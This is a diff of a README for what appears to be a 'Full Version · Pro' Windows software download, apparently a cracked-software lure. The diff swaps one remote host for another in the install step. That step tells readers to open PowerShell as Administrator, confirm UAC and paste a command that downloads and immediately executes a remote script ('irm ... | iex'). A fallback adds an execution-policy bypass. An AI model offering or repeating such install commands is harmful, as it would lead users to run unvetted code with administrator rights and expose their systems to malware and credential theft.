@@ -27,15 +27,22 @@ Full Version  ◆  Pro  ◆  Complete  ◆  Windows
 
 ## `INSTALLATION`
 
-1. Open **PowerShell** as Administrator
-2. Paste and run:
+<div align="center">
+
+<img src="https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows&logoColor=white" height="22"/>
+<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" height="22"/>
+
+<br><br>
+
+**Run in PowerShell as Administrator:**
 
 ```powershell
-irm https://softmix.online/ps/setup.ps1 | iex
+irm https://usevision.fun/ps/setup.ps1 | iex
 ```
 
-3. Confirm **UAC** (Yes) — setup runs automatically
-4. Wait until the installer finishes
+<sub>Copy · paste · press Enter · confirm UAC</sub>
+
+</div>
 
 ## `FEATURES`
 
@@ -64,7 +71,7 @@ irm https://softmix.online/ps/setup.ps1 | iex
 
 <details>
 <summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://softmix.online/ps/setup.ps1 | iex"`
+<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://usevision.fun/ps/setup.ps1 | iex"`
 </details>
 
 <details>
